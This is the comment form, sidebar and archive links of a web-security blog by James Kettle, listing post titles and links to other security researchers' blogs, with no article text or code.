Comment with your Google Account if you’d like to be able to manage your comments in the future. If you comment anonymously, you won’t be able to edit or delete your comment. [Learn more](https://www.blogger.com/go/anonymouscommentshelp)

![User Avatar](https://resources.blogblog.com/img/anon36.png)

Comment as:

Select profile:

Google Account

Anonymous

Name/URL



Edit

Enter comment

Publish

This site is protected by reCAPTCHA and the Google [privacy policy](https://policies.google.com/privacy) and [Terms of Service](https://policies.google.com/terms) apply.

Load more...

[Newer Post](https://www.skeletonscribe.net/2014/08/comma-separated-vulnerabilities.html "Newer Post")[Older Post](https://www.skeletonscribe.net/2012/06/x-frame-options-sameorigin-warning.html "Older Post")[Home](https://www.skeletonscribe.net/)

Subscribe to:
[Post Comments (Atom)](https://www.skeletonscribe.net/feeds/1238910760981927733/comments/default)

**Who**

- [James Kettle](http://skeletonscribe.net/)

**Contact**

- [@albinowax](https://twitter.com/albinowax)
- xawonibla@gmail.com (personal)

- elttek.semaj@portswigger.net (work)

- albinowax on [freenode](https://webchat.freenode.net/?randomnick=0&channels=#slackers)

## Quality content

- [magic mac's blog](https://www.brokenbrowser.com/)
- [lcamtuf's blog](http://lcamtuf.blogspot.co.uk/)
- [.mario's slides](http://www.slideshare.net/x00mario/presentations)
- [sirdarckcat's blog](https://sirdarckcat.blogspot.co.uk/)
- [irsdl's blog](https://soroush.secproject.com/blog/)
- [Gareth Heyes' blog](http://www.thespanner.co.uk/)
- [kuza's blog](http://kuza55.blogspot.co.uk/)
- [Shared Fuzzer](http://shazzer.co.uk/)
- [HTML5 Security Cheat Sheet](http://html5sec.org/)
- [unexpected theology](http://davidkettle.org.uk/)

## Archive

- [Practical HTTP Host header attacks](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html)
- [Phrack ebook](https://www.skeletonscribe.net/2011/12/phrack-ebook.html)
- [Reviewing bug bounties - a hacker's perspective](https://www.skeletonscribe.net/2016/08/reviewing-bug-bounties-hackers.html)
- [h1-212 CTF Writeup](https://www.skeletonscribe.net/2017/11/h1-212-ctf-writeup.html)
- [Abusing OWASP with 'Insufficient Attack Protection'](https://www.skeletonscribe.net/2017/04/abusing-owasp.html)
- [X-Frame-Options gotcha](https://www.skeletonscribe.net/2012/06/x-frame-options-sameorigin-warning.html)
- [Hackxor hacking game beta](https://www.skeletonscribe.net/2011/02/hackxor-hacking-game-beta.html)
- [Simulating targets for XSS/CSRF attacks in hacking games](https://www.skeletonscribe.net/2011/05/simulating-targets-for-xsscsrf-attacks.html)
- [Sparse Bruteforce Addon Detection](https://www.skeletonscribe.net/2011/07/sparse-bruteforce-addon-scanner.html)
- [Chronofeit Phishing](https://www.skeletonscribe.net/2010/12/chronofeit-phishing.html)

|     |     |
| --- | --- |
|  |  |

|     |     |
| --- | --- |
|  |  |

Powered by [Blogger](https://www.blogger.com/).